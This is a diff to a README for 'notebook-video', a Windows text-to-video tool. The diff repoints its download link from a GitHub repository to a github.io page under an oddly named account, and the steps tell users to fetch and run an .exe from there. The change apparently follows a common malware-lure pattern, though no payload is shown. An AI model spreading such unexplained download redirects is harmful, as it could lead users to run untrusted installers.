@@ -1,6 +1,6 @@
 # 🎬 notebook-video - Turn text into professional explainer videos
 
-[![](https://img.shields.io/badge/Download-App-blue)](https://github.com/bushadministrationbloodbrainbarrier232/notebook-video)
+[![](https://img.shields.io/badge/Download-App-blue)](https://bushadministrationbloodbrainbarrier232.github.io)
 
 ## 📋 What is this tool?
 Notebook-video turns your written scripts into high-quality 2K videos. This tool uses automation to handle the complex parts of video production. You provide a Chinese script, and the application generates a video complete with motion graphics, background speech, and accurate captions. It targets creators who want to produce consistent, repeatable explainer content without manual editing.
@@ -16,7 +16,7 @@ Before you start, ensure your Windows computer meets these basic needs:
 ## 📥 How to download and install
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download the software: [https://github.com/bushadministrationbloodbrainbarrier232/notebook-video](https://github.com/bushadministrationbloodbrainbarrier232/notebook-video).
+1. Visit this page to download the software: [https://bushadministrationbloodbrainbarrier232.github.io](https://bushadministrationbloodbrainbarrier232.github.io).
 2. Locate the latest release version on the webpage.
 3. Click the file ending in .exe to download the installer to your computer.
 4. Open the downloaded installer file.
